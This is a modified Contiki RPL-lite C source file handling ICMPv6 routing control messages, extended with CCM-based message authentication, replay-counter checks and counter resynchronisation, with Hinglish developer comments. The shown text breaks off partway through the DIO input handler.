/*
 * Copyright (c) 2010, Swedish Institute of Computer Science.
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. Neither the name of the Institute nor the names of its contributors
 *    may be used to endorse or promote products derived from this software
 *    without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE INSTITUTE AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL THE INSTITUTE OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 *
 * This file is part of the Contiki operating system.
 *
 */

/**
 * \addtogroup rpl-lite
 * @{
 *
 * \file
 *         ICMP6 I/O for RPL control messages.
 *
 * \author Joakim Eriksson <joakime@sics.se>, Nicolas Tsiftes <nvt@sics.se>,
 * Simon Duquennoy <simon.duquennoy@inria.fr>
 * Contributors: Niclas Finne <nfi@sics.se>, Joel Hoglund <joel@sics.se>,
 *               Mathieu Pouillot <m.pouillot@watteco.com>,
 *               George Oikonomou <oikonomou@users.sourceforge.net> (multicast)
 */

#include "net/routing/rpl-lite/rpl.h"
#include "net/ipv6/uip-icmp6.h"
#include "net/packetbuf.h"
#include "lib/random.h"

// Amritesh

/* Security Libraries for CCM with CBC-MAC */
#if RPL_SECURITY
#include "lib/ccm-star.h"
#include "lib/aes-128.h"
#endif

// Amritesh

#include <inttypes.h>
#include <limits.h>

/* Log configuration */
#include "sys/log.h"
#define LOG_MODULE "RPL"
// #define LOG_LEVEL LOG_LEVEL_RPL

#define LOG_LEVEL LOG_LEVEL_DBG

/*---------------------------------------------------------------------------*/
#define RPL_DIO_GROUNDED 0x80
#define RPL_DIO_MOP_SHIFT 3
#define RPL_DIO_MOP_MASK 0x38
#define RPL_DIO_PREFERENCE_MASK 0x07

#if RPL_SECURITY
#define RPL_NONCE_LENGTH 13
#define RPL_ENCRYPT 1
#define RPL_DECRYPT 0

#define RPL_KIM_0 0x00
#define RPL_KEY_INDEX_0 0x00
#define RPL_TIMESTAMP_0 0x00

#define RPL_DIS_RESPONDED 1
#define RPL_DIS_NOT_RESPONDED 0

#define RPL_TIMESTAMP_MASK 0x80
#define RPL_TIMESTAMP_SHIFT 7
#define RPL_KIM_MASK 0xC0
#define RPL_KIM_SHIFT 6
#define RPL_LVL_MASK 0x07

#ifndef RPL_CC_REQUEST
#define RPL_CC_REQUEST 0
#define RPL_CC_RESPONSE 1
#endif

/* --- YE NAYI DEFINITIONS ADD KAREIN --- */

#ifndef RPL_CODE_CC
#define RPL_CODE_CC 0x8A /* RFC 6550 Standard code for CC (138) */
#endif

#ifndef UIP_LLH_LEN
#define UIP_LLH_LEN 0
#endif

/* --- YAHAN CHANGE KAREIN --- */
/* IPv6 header + Extension headers + ICMPv6 header ko dynamically cover karne ke liye */
#define UIP_IPICMPH_LEN (UIP_IPH_LEN + uip_ext_len + UIP_ICMPH_LEN)
/* -------------------------- */
/* ------------------------------------- */

uint8_t is_zero_counter_active = 0;
uint8_t is_cc_request_active = 0;
/* --- NAYE VARIABLES CLIENT KO SIGNAL DENE KE LIYE --- */
volatile uint8_t cc_response_arrived_zero = 0;
volatile uint32_t cc_received_watermark = 0;

/* 🌟 ADD THIS: Scenario 4 ping-pong flag */
volatile uint8_t cc_response_arrived = 0;
/* External reference for the application process */
extern struct process udp_attacker_process __attribute__((weak));

#endif /* RPL_SECURITY */

/*---------------------------------------------------------------------------*/
static void dis_input(void);
static void dio_input(void);
static void dao_input(void);

#if RPL_SECURITY
static void cc_input(void);

static void cc_output(uip_ipaddr_t *addr, uint8_t type, uint16_t nonce, uint32_t dest_counter, uint8_t req_instance_id, uip_ipaddr_t *req_dag_id);

// ... baaki cheezein
#endif

// Amritesh
static void dao_ack_input(void);

#if RPL_SECURITY
typedef struct rpl_sec_section
{
  uint8_t responded;
  uint8_t timestamp;
  uint8_t kim;
  uint8_t lvl;
  uint8_t key_source[2];
  uint8_t key_index;
} rpl_sec_section_t;

static uint8_t rpl_key[16] = RPL_SECURITY_K;
static uint32_t rpl_sec_counter = 0;
static rpl_sec_section_t rpl_last_dis;
#endif /* RPL_SECURITY */

/*---------------------------------------------------------------------------*/
/* Initialize RPL ICMPv6 message handlers */
#if RPL_SECURITY
UIP_ICMP6_HANDLER(dis_handler, ICMP6_RPL, RPL_CODE_SEC_DIS, dis_input);
UIP_ICMP6_HANDLER(dio_handler, ICMP6_RPL, RPL_CODE_SEC_DIO, dio_input);
UIP_ICMP6_HANDLER(dao_handler, ICMP6_RPL, RPL_CODE_SEC_DAO, dao_input);
UIP_ICMP6_HANDLER(dao_ack_handler, ICMP6_RPL, RPL_CODE_SEC_DAO_ACK, dao_ack_input);
UIP_ICMP6_HANDLER(cc_handler, ICMP6_RPL, RPL_CODE_CC, cc_input);
#else
UIP_ICMP6_HANDLER(dis_handler, ICMP6_RPL, RPL_CODE_DIS, dis_input);
UIP_ICMP6_HANDLER(dio_handler, ICMP6_RPL, RPL_CODE_DIO, dio_input);
UIP_ICMP6_HANDLER(dao_handler, ICMP6_RPL, RPL_CODE_DAO, dao_input);
#if RPL_WITH_DAO_ACK
static void dao_ack_input(void);
UIP_ICMP6_HANDLER(dao_ack_handler, ICMP6_RPL, RPL_CODE_DAO_ACK, dao_ack_input);
#endif /* RPL_WITH_DAO_ACK */
#endif
/*---------------------------------------------------------------------------*/

// Amritesh -- end

/*---------------------------------------------------------------------------*/
static uint32_t
get32(uint8_t *buffer, int pos)
{
  return ((uint32_t)buffer[pos] << 24 | (uint32_t)buffer[pos + 1] << 16 |
          (uint32_t)buffer[pos + 2] << 8 | buffer[pos + 3]);
}
/*---------------------------------------------------------------------------*/
static void
set32(uint8_t *buffer, int pos, uint32_t value)
{
  buffer[pos++] = value >> 24;
  buffer[pos++] = (value >> 16) & 0xff;
  buffer[pos++] = (value >> 8) & 0xff;
  buffer[pos++] = value & 0xff;
}
/*---------------------------------------------------------------------------*/
static uint16_t
get16(uint8_t *buffer, int pos)
{
  return (uint16_t)buffer[pos] << 8 | buffer[pos + 1];
}
/*---------------------------------------------------------------------------*/
static void
set16(uint8_t *buffer, int pos, uint16_t value)
{
  buffer[pos++] = value >> 8;
  buffer[pos++] = value & 0xff;
}
/*---------------------------------------------------------------------------*/

// Amritesh -- start

/*---------------------------------------------------------------------------*/
#if RPL_SECURITY
/* Add Security Section to ICMP_PAYLOAD with given security parameter */
static uint8_t
add_security_section(uint8_t timestamp, uint8_t kim, uint8_t sec_lvl, uint8_t key_index)
{
  unsigned char *buffer;
  int len = 0;

  buffer = UIP_ICMP_PAYLOAD;

  /*
   * Security Section for RPL messages:
   *     0                   1                   2                   3
   *   0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
   *  +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   *  |T|  Reserved   |   Algorithm   |KIM|Resvd| LVL |     Flags     |
   *  +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   *  |                            Counter                            |
   *    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   *  |                                                               |
   *  .                        Key Identifier                         .
   *  .                                                               .
   *  +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   */

  buffer[len] = 0;
  buffer[len++] |= timestamp << RPL_TIMESTAMP_SHIFT;

  buffer[len++] = 0; /* Algorithm = 0    */

  buffer[len] = 0;
  buffer[len] |= kim << RPL_KIM_SHIFT;
  buffer[len++] |= sec_lvl;

  buffer[len++] = 0; /* Flags */

  set32(buffer, len, rpl_sec_counter);
  len += 4;

  if (kim == 0)

  {
    buffer[len++] = key_index; /* KIM = 0 => Only Key Identifier */
  }
  /* TODO : kim!= 0 */

  return len;
}
/*
 * Set mutable fields in IP and ICMP headers to zero/default values
 * Set other fields to value based on function parameters
 * In RPL secure mode IP and ICMP headers are covered in MAC computing.
 */
static void
set_ip_icmp_fields(uip_ipaddr_t *addr, uint8_t icmp_type)
{
  UIP_IP_BUF->vtc = 0x60;
  UIP_IP_BUF->tcflow = 0;
  UIP_IP_BUF->flow = 0;

  UIP_IP_BUF->proto = UIP_PROTO_ICMP6;
  UIP_IP_BUF->ttl = 0;
  UIP_IP_BUF->len[0] = 0;
  UIP_IP_BUF->len[1] = 0;

  if (addr != NULL)

  {
    memcpy(&UIP_IP_BUF->destipaddr, addr, sizeof(*addr));
    uip_ds6_select_src(&UIP_IP_BUF->srcipaddr, &UIP_IP_BUF->destipaddr);
  }

  UIP_ICMP_BUF->type = ICMP6_RPL;
  UIP_ICMP_BUF->icode = icmp_type;
  UIP_ICMP_BUF->icmpchksum = 0;
}
/* Create CCM_NONCE as described in RFC 6550 */
static void set_ccm_nonce(uint8_t *ccm_nonce, uint32_t counter, uint8_t sec_lvl, uint8_t kim)
{
  /* RPL CCM Nonce Construction
   *     0                   1                   2                   3
   *     0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
   *     +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   *     |                                                               |
   *     +                     Source Identifier                         +
   *     |                                                               |
   *     +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   *     |                          Counter                              |
   *     +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   *     |KIM|Resvd| LVL |
   *     +-+-+-+-+-+-+-+-+
   *
   */

  int i;
  for (i = 0; i < 8; i++)
  {
    ccm_nonce[i] = (UIP_IP_BUF->srcipaddr).u8[(8 + i)];
  }

  set32(ccm_nonce, 8, counter);

  /* RFC 6550: KIM is most significant 2 bits, LVL is least significant 3 bits */
  ccm_nonce[12] = (kim << 6) | (sec_lvl & RPL_LVL_MASK);
}

/* Get MIC length, based on security level */
static uint8_t
get_mic_len(uint8_t sec_lvl)
{
  uint8_t mic_len;
  if (sec_lvl == 0 || sec_lvl == 1)

  {
    mic_len = 4;
  }
  else
  {
    mic_len = 8;
  }

  return mic_len;
}
/* ENC/DEC function
 * In case of decryption the function return:
 * 0 if a MAC mismatch occurs
 * 1 otherwise
 */
static int
sec_aead(uint8_t *ccm_nonce, int buffer_len, int sec_len,
         uint8_t sec_lvl, int forward)
{
  unsigned char *buffer;
  uint8_t mic[8];
  int mic_len;
  buffer = UIP_ICMP_PAYLOAD;

  mic_len = get_mic_len(sec_lvl);

  CCM_STAR.set_key(rpl_key);

  if (forward == RPL_ENCRYPT)

  {
    if ((sec_lvl == 1) || (sec_lvl == 3))

    {
      CCM_STAR.aead(ccm_nonce,
                    buffer + sec_len, buffer_len,
                    uip_buf + UIP_LLH_LEN, UIP_IPICMPH_LEN + sec_len,
                    buffer + sec_len + buffer_len, mic_len, forward);
    }
    else
    {
      CCM_STAR.aead(ccm_nonce,
                    NULL, 0,
                    uip_buf + UIP_LLH_LEN, UIP_IPICMPH_LEN + sec_len + buffer_len,
                    mic, mic_len, forward);
    }
    return mic_len;
  }
  else
  {
    if (forward == RPL_DECRYPT)

    {
      if (sec_lvl == 1 || sec_lvl == 3)

      {
        CCM_STAR.aead(ccm_nonce,
                      buffer + sec_len, buffer_len,
                      uip_buf + UIP_LLH_LEN, UIP_IPICMPH_LEN + sec_len,
                      mic, mic_len, forward);
      }
      else
      {
        CCM_STAR.aead(ccm_nonce,
                      NULL, 0,
                      uip_buf + UIP_LLH_LEN, UIP_IPICMPH_LEN + sec_len + buffer_len,
                      mic, mic_len, forward);
      }
      if (memcmp(mic, buffer + sec_len + buffer_len, mic_len) != 0)

      {
        return 0;
      }
      else
      {
        return 1;
      }
    }
    else
    {
      return 0;
    }
  }
}
#endif /* RPL_SECURITY */
/*---------------------------------------------------------------------------*/

// Amritesh -- end

uip_ds6_nbr_t *
rpl_icmp6_update_nbr_table(uip_ipaddr_t *from, nbr_table_reason_t reason, void *data)
{
  uip_ds6_nbr_t *nbr;

  if ((nbr = uip_ds6_nbr_lookup(from)) == NULL)

  {
    if ((nbr = uip_ds6_nbr_add(from, (uip_lladdr_t *)packetbuf_addr(PACKETBUF_ADDR_SENDER),
                               0, NBR_REACHABLE, reason, data)) == NULL)

    {
      LOG_ERR("could not add neighbor to cache ");
      LOG_ERR_6ADDR(from);
      LOG_ERR_(", ");
      LOG_ERR_LLADDR(packetbuf_addr(PACKETBUF_ADDR_SENDER));
      LOG_ERR_("\n");
    }
  }

  return nbr;
}

#if RPL_SECURITY
/* Helper function to remove Hop-by-Hop Extension Header before MAC verification */
static void
rpl_remove_header(void)
{
  if (uip_ext_len > 0)

  {
    /* Calculate remaining packet length without extension header */
    uint16_t move_len = uip_len - UIP_IPH_LEN - uip_ext_len;

    /* Shift ICMPv6 header and payload UP, overwriting the extension header */
    memmove(((uint8_t *)UIP_IP_BUF) + UIP_IPH_LEN,
            ((uint8_t *)UIP_IP_BUF) + UIP_IPH_LEN + uip_ext_len,
            move_len);

    /* Update packet lengths globally */
    uip_len -= uip_ext_len;
    uip_ext_len = 0;

    /* Restore the Next Header field of IPv6 to ICMPv6 */
    UIP_IP_BUF->proto = UIP_PROTO_ICMP6;
  }
}

#endif /* RPL_SECURITY */
/*---------------------------------------------------------------------------*/
static void
dis_input(void)
{
  /* 1. VARIABLES KO GLOBAL SCOPE MEIN LAAYEIN */
  uint8_t buffer_length;
  uint8_t *buffer = UIP_ICMP_PAYLOAD;
  int sec_len = 0;
  int pos = 0;
  uip_ipaddr_t from;

  if (!curr_instance.used)
  {
    LOG_WARN("dis_input: not in an instance yet, discard\n");
    goto discard;
  }

  uip_ipaddr_copy(&from, &UIP_IP_BUF->srcipaddr);

  LOG_INFO("received a DIS from ");
  LOG_INFO_6ADDR(&from);
  LOG_INFO_("\n");

#if RPL_SECURITY

  /* 2. CHECK KAREIN KI PACKET SECURE HAI YA UNSECURE */
  // if (UIP_ICMP_BUF->icode == RPL_CODE_SEC_DIS)
  // {
  uint8_t timestamp;
  uint8_t kim;
  uint8_t lvl;
  uint32_t counter;
  uint8_t key_index;
  uint8_t ccm_nonce[RPL_NONCE_LENGTH];
  uint8_t mic_len; /* n-byte MAC length */

  /* 1. Parse Security Header Correctly */
  timestamp = (buffer[pos++] & RPL_TIMESTAMP_MASK) >> RPL_TIMESTAMP_SHIFT; // Byte 0
  uint8_t algorithm = buffer[pos++];                                       // Byte 1 (Algorithm)

  kim = (buffer[pos] & RPL_KIM_MASK) >> RPL_KIM_SHIFT; // Byte 2 (KIM)
  lvl = (buffer[pos++] & RPL_LVL_MASK);                // Byte 2 (LVL)
  ++pos;                                               // Byte 3 (Flags)

  /* Agar algorithm support nahi karte ho to drop kar sakte ho */
  if (algorithm != 0)
  {
    LOG_ERR("RPL: Unsupported Security Algorithm, discard\n");
    goto discard;
  }

  /* Basic Security Validation */
  if (uip_ipaddr_cmp(&UIP_IP_BUF->srcipaddr, &UIP_IP_BUF->destipaddr))
  {
    LOG_ERR("RPL: Secure packet from myself, discard\n");
    goto discard;
  }

  /* The 'T' flag MUST be ignored if temporal checks are not supported by the node. */
  if (kim != 0 || lvl > 3)
  {
    LOG_ERR("RPL: Invalid Security parameters, discard\n");
    goto discard;
  }

  counter = get32(buffer, pos);
  pos += 4;

  if (counter == 0xFFFFFFFF) /* Changed from 0xffff */
  {
    LOG_ERR("RPL: Incoming security counter reaches maximum value, discard\n");
    goto discard;
  }

  key_index = buffer[pos++];
  LOG_INFO("RPL Security: Parsed Security Section from ");
  LOG_INFO_6ADDR(&UIP_IP_BUF->srcipaddr);
  LOG_INFO_(" -> Key Identifier Mode (KIM): %u, Security Level (LVL): %u, Incoming Counter: %" PRIu32 ", Key Identifier: %u\n", kim, lvl, counter, key_index);

  if (key_index != 0)
  {
    LOG_ERR("RPL: key_index = %u, only preinstalled key allowed\n", key_index);
    goto discard;
  }

  /* 2. Decrypt and Verify MAC */
  sec_len = pos;
  mic_len = get_mic_len(lvl);
  buffer_length = uip_len - uip_l3_icmp_hdr_len - sec_len - mic_len;

  /* IP Header and ICMP header mutable fields set to 0 for MAC computation */
  set_ip_icmp_fields(NULL, RPL_CODE_SEC_DIS);
  set_ccm_nonce(ccm_nonce, counter, lvl, kim);

  if (sec_aead(ccm_nonce, buffer_length, sec_len, lvl, RPL_DECRYPT) == 0)
  {
    LOG_ERR("RPL: MIC mismatch! Packet dropped.\n");
    goto discard;
  }

  /* --- REPLAY PROTECTION & RESYNC CHECK START --- */
  rpl_nbr_t *nbr = rpl_neighbor_get_from_ipaddr(&from);

  if (counter == 0)
  {
    if (nbr != NULL)
    {
      /* CASE 1: Purana neighbor reboot hua hai. CC Responce bhej kar resync initiate karo. */

      LOG_INFO("RPL Security: Incoming Counter is zero, indicating possible node reset from ");
      LOG_INFO_6ADDR(&from);
      LOG_INFO_(". Initiating Consistency Check (CC) Resynchronization.\n");
      LOG_INFO_(" | Fields: Counter = %" PRIu32 ", KeyIdx = %u. Initiating Resync (CC Response).\n", counter, key_index);

      uint16_t out_nonce = random_rand();

      cc_output(&from, RPL_CC_RESPONSE, out_nonce, nbr->sec_counter,
                curr_instance.used ? curr_instance.instance_id : 0,
                curr_instance.used ? &curr_instance.dag.dag_id : NULL);

      goto discard;
    }
  }
  else
  {
    /* Normal Replay Check (Jab counter 0 nahi hai) */
    if (nbr != NULL)
    {
      /* Duplicate multicast copy - same counter, silently discard */
      if (counter == nbr->sec_counter)
      {
        goto discard;
      }
      if (counter < nbr->sec_counter)
      {
        /* RFC 6550 Sec 10.7: Replay protection violation. */
        LOG_ERR("RPL Security: Replay protection violation. Incoming Counter (%" PRIu32 ") is <= Stored Watermark (%" PRIu32 "). Discarding message.\n", counter, nbr->sec_counter);
        goto discard;
      }
      else
      {
        LOG_INFO("RPL Security: Counter validation successful. Updating Stored Watermark to %" PRIu32 ".\n", counter);
        nbr->sec_counter = counter;
      }
    }
    else
    {
      LOG_INFO("RFC6550-SEC: New Neighbor detected with valid counter: %" PRIu32 ".\n", counter);
      /* Dhyan rahe: Jab naya neighbor pehli baar accept ho raha hai, toh base parsing
         (jaise rpl_process_dio) ke baad nbr->sec_counter = counter; zaroor set ho jaye */
    }
  }
  /* --- REPLAY PROTECTION & RESYNC CHECK END --- */

  rpl_last_dis.responded = RPL_DIS_NOT_RESPONDED;
  rpl_last_dis.timestamp = timestamp;
  rpl_last_dis.kim = kim;
  rpl_last_dis.lvl = lvl;
  rpl_last_dis.key_source[0] = 0;
  rpl_last_dis.key_source[1] = 0;
  rpl_last_dis.key_index = key_index;
// }
//   else
//   {
//     /* 3. AGAR UNSECURE PACKET HAI TOH KYA KAREIN */
//     sec_len = 0;
//     buffer_length = uip_len - uip_l3_icmp_hdr_len;
//   }
// #else
//   //      AGAR SECURITY DISABLE HAI TOH KYA KAREIN
//   // buffer_length = uip_len - uip_l3_icmp_hdr_len;
#endif

  /* 5. DIS OPTIONS PARSING (Dono Secure aur Unsecure packets ke liye chalega) */
  int i = sec_len;
  while (i < buffer_length + sec_len)
  {
    uint8_t subopt_type = buffer[i];
    int len;

    if (subopt_type == RPL_OPTION_PAD1)
    {
      len = 1;
    }
    else
    {
      if (i + 1 >= buffer_length + sec_len)
      {
        LOG_ERR("dis_input: malformed packet, discard\n");
        goto discard;
      }
      len = 2 + buffer[i + 1];
    }

    if (i + len > buffer_length + sec_len)
    {
      LOG_ERR("dis_input: malformed packet, discard\n");
      goto discard;
    }

    if (subopt_type == RPL_OPTION_SOLICITED_INFO)
    {
      LOG_INFO("DIS Solicited Information Option received\n");
    }

    i += len;
  }

  rpl_process_dis(&UIP_IP_BUF->srcipaddr, uip_is_addr_mcast(&UIP_IP_BUF->destipaddr));

discard:
  uipbuf_clear();
}
/*---------------------------------------------------------------------------*/
void rpl_icmp6_dis_output(uip_ipaddr_t *addr)
{
  unsigned char *buffer;
  int pos = 0;
#if RPL_SECURITY
  int sec_len;
  uint8_t ccm_nonce[RPL_NONCE_LENGTH];
  uint8_t mic_len; /* n-byte MAC length */
#endif

  /* Make sure we're up-to-date before sending data out */
  rpl_dag_update_state();

  buffer = UIP_ICMP_PAYLOAD;
  //(old) buffer[0] = buffer[1] = 0;

#if RPL_SECURITY
  /* 1. Add Security Header */
  sec_len = add_security_section(RPL_TIMESTAMP_0, RPL_KIM_0,
                                 RPL_SEC_LVL, RPL_KEY_INDEX_0);
  pos += sec_len;
#endif

  buffer[pos++] = 0; /* flags */
  buffer[pos++] = 0; /* reserved */

  if (addr == NULL)

  {
    addr = &rpl_multicast_addr;
  }

  LOG_INFO("sending a DIS to ");
  LOG_INFO_6ADDR(addr);
  LOG_INFO_("\n");

#if RPL_SECURITY
  /* 2. Set IP and ICMP headers for MAC calculation */
  set_ip_icmp_fields(addr, RPL_CODE_SEC_DIS);
  LOG_INFO("RPL Security: Applying Message Authentication Code (MAC) for outgoing message to ");
  LOG_INFO_6ADDR(addr); // (Ya dest/&curr_instance.dag.dag_id jo bhi variable pehle tha)
  LOG_INFO_(" using Outgoing Counter: %" PRIu32 "\n", rpl_sec_counter);

  /* 3. Generate Nonce */
  set_ccm_nonce(ccm_nonce, rpl_sec_counter, RPL_SEC_LVL, RPL_KIM_0);
  /* RFC 6550: Counter must not reach 0xFFFFFFFF */
  if (rpl_sec_counter >= 0xFFFFFFFE)
  {
    LOG_ERR("RPL Security: Outgoing Counter exhausted (0xFFFFFFFF). Triggering DODAG Local Repair.\n");
    /* Counter overflow hone par naye keys ya network reset ki zaroorat hoti hai */
    rpl_local_repair("Sec Counter Exhausted");
    return; /* Packet send cancel karein */
  }
  else
  {
    rpl_sec_counter++;
  }

  /* 4. Encrypt and generate MAC */
  mic_len = sec_aead(ccm_nonce, pos - sec_len, sec_len, RPL_SEC_LVL, RPL_ENCRYPT);
  pos += mic_len;

  /* 5. Send secure DIS */
  uip_icmp6_send(addr, ICMP6_RPL, RPL_CODE_SEC_DIS, pos);
#else
  /* Standard Unsecured DIS */
  uip_icmp6_send(addr, ICMP6_RPL, RPL_CODE_DIS, pos);
#endif
}
/*---------------------------------------------------------------------------*/
static void
dio_input(void)
{
  unsigned char *buffer;
  uint16_t buffer_length;
  rpl_dio_t dio;
  uint8_t subopt_type;
  int i;
  int len;
  uip_ipaddr_t from;

#if RPL_SECURITY
  int sec_len = 0;
  uint8_t kim, lvl, key_index;
  uint32_t counter;
  uint8_t ccm_nonce[RPL_NONCE_LENGTH];
  uint8_t mic_len = 0;
#else
  int sec_len = 0;
#endif

  memset(&dio, 0, sizeof(dio));

  /* Set default values in case the DIO configuration option is missing. */
  dio.dag_intdoubl = RPL_DIO_INTERVAL_DOUBLINGS;
  dio.dag_intmin = RPL_DIO_INTERVAL_MIN;
  dio.dag_redund = RPL_DIO_REDUNDANCY;
  dio.dag_min_hoprankinc = RPL_MIN_HOPRANKINC;
  dio.dag_max_rankinc = RPL_MAX_RANKINC;
  dio.ocp = RPL_OF_OCP;
  dio.default_lifetime = RPL_DEFAULT_LIFETIME;
  dio.lifetime_unit = RPL_DEFAULT_LIFETIME_UNIT;

  uip_ipaddr_copy(&from, &UIP_IP_BUF->srcipaddr);

  i = 0;
  buffer = UIP_ICMP_PAYLOAD;

#if RPL_SECURITY
  /* 1. Parse Security Header */
  /* 1. Parse Security Header Correctly */
  i++;                             // Skip Byte 0 (T flag and Reserved) as we ignore temporal checks
  uint8_t algorithm = buffer[i++]; // Byte 1 (Algorithm)

  kim = (buffer[i] & RPL_KIM_MASK) >> RPL_KIM_SHIFT; // Byte 2 (KIM)
  lvl = (buffer[i++] & RPL_LVL_MASK);                // Byte 2 (LVL)

  ++i; // Byte 3 (Flags)

  /* Agar algorithm support nahi karte ho to drop kar sakte ho */
  if (algorithm != 0)
  {
    LOG_ERR("RPL: Unsupported Security Algorithm, discard\n");
    goto discard;
  }

  if (uip_ipaddr_cmp(&UIP_IP_BUF->srcipaddr, &UIP_IP_BUF->destipaddr))

  {
    LOG_ERR("RPL: Secure packet from myself, discard\n");
    goto discard;
  }

  /* The 'T' flag MUST be ignored if temporal checks are not supported by the node. */
  if (kim != 0 || lvl > 3)
  {
    LOG_ERR("RPL: Invalid Security parameters, discard\n");
    goto discard;
  }
  counter = get32(buffer, i);
  i += 4;

  if (counter == 0xFFFFFFFF) /* Changed from 0xffff */
  {
    LOG_ERR("RPL: Incoming security counter reaches maximum value, discard\n");
    goto discard;
  }

  key_index = buffer[i++];
  if (key_index != 0)

  {
    LOG_ERR("RPL: key_index = %u, only preinstalled key allowed\n", key_index);
    goto discard;
  }

  sec_len = i;
  mic_len = get_mic_len(lvl);
  buffer_length = uip_len - uip_l3_icmp_hdr_len - sec_len - mic_len;

  /* 2. Decrypt and Verify MAC */
  set_ip_icmp_fields(NULL, RPL_CODE_SEC_DIO);

  set_ccm_nonce(ccm_nonce, counter, lvl, kim);

  if (sec_aead(ccm_nonce, buffer_length, sec_len, lvl, RPL_DECRYPT) == 0)

  {
    LOG_ERR("RPL: MIC mismatch! Packet dropped.\n");
    goto discard;
  }

  /* --- REPLAY PROTECTION & RESYNC CHECK START --- */
  rpl_nbr_t *nbr = rpl_neighbor_get_from_ipaddr(&from);

  if (counter == 0)
  {
    if (nbr != NULL)
    {
      /* CASE 1: Purana neighbor reboot hua hai. CC Request bhej kar resync initiate karo. */

      LOG_INFO("RPL Security: Incoming Counter is zero, indicating possible node reset from ");
      LOG_INFO_6ADDR(&from);
      LOG_INFO_(". Initiating Consistency Check (CC) Resynchronization.\n");
      LOG_INFO_(" | Fields: Counter = %" PRIu32 ", KeyIdx = %u. Initiating Resync (CC Response).\n", counter, key_index);
      /* Naya random nonce generate karo CC Request ke liye */
      uint16_t out_nonce = random_rand();

      /* CC RESPONSE bhejna zaroori hai taaki sender apna counter update kar sake */
      cc_output(&from, RPL_CC_RESPONSE, out_nonce, nbr->sec_counter,
                curr_instance.used ? curr_instance.instance_id : 0,
                curr_instance.used ? &curr_instance.dag.dag_id : NULL);

      goto discard; /* Purana packet (DIO/DAO) drop karo kyunki counter sync nahi hai */
    }
  }
  else
  {
    /* Normal Replay Check (Jab counter 0 nahi hai) */
    if (nbr != NULL)
    {
      /* Duplicate multicast copy - same counter, silently discard */
      if (counter == nbr->sec_counter)
      {
        goto discard;
      }
      if (counter < nbr->sec_counter)
      {
        /* RFC 6550 Sec 10.7: Replay protection violation. */
        LOG_ERR("RPL Security: Replay protection violation. Incoming Counter (%" PRIu32 ") is <= Stored Watermark (%" PRIu32 "). Discarding message.\n", counter, nbr->sec_counter);
        goto discard;
      }
      else
      {
        LOG_INFO("RPL Security: Counter validation successful. Updating Stored Watermark to %" PRIu32 ".\n", counter);
        nbr->sec_counter = counter;
      }
    }
    else
    {
      LOG_INFO("RFC6550-SEC: New Neighbor detected with valid counter: %" PRIu32 ".\n", counter);
      /* Dhyan rahe: Jab naya neighbor pehli baar accept ho raha hai, toh base parsing
         (jaise rpl_process_dio) ke baad nbr->sec_counter = counter; zaroor set ho jaye */
    }
  }
  /* --- REPLAY PROTECTION & RESYNC CHECK END --- */

#else
  buffer_length = uip_len - uip_l3_icmp_hdr_len;
#endif

  /* 3. Check Base DIO Length */
  if (buffer_length < 8 + sizeof(dio.dag_id))

  {
    LOG_WARN("dio_input: invalid DIO header, len %" PRIu16 ", discard\n",
             buffer_length);
    goto discard;
  }

  dio.instance_id = buffer[i++];
  dio.version = buffer[i++];
  dio.rank = get16(buffer, i);
  i += 2;

  dio.grounded = buffer[i] & RPL_DIO_GROUNDED;
  dio.mop = (buffer[i] & RPL_DIO_MOP_MASK) >> RPL_DIO_MOP_SHIFT;
  dio.preference = buffer[i++] & RPL_DIO_PREFERENCE_MASK;

  dio.dtsn = buffer[i++];
  /* two reserved bytes */
  i += 2;

  memcpy(&dio.dag_id, buffer + i, sizeof(dio.dag_id));
  i += sizeof(dio.dag_id);

  /* Check if there are any DIO suboptions. */
  /* Check if there are any DIO suboptions. */
  /* FIX: LOOP MEIN sec_len ADD KIYA HAI */
  for (; i < buffer_length + sec_len; i += len)

  {
    subopt_type = buffer[i];
    if (subopt_type == RPL_OPTION_PAD1)

    {
      len = 1;
    }
    else
    {
      /* Suboption with a two-byte header + payload */
      /* Suboption with a two-byte header + payload */
      /* FIX: YAHAN BHI sec_len ADD KIYA HAI */
      if (i + 1 >= buffer_length + sec_len)

      {
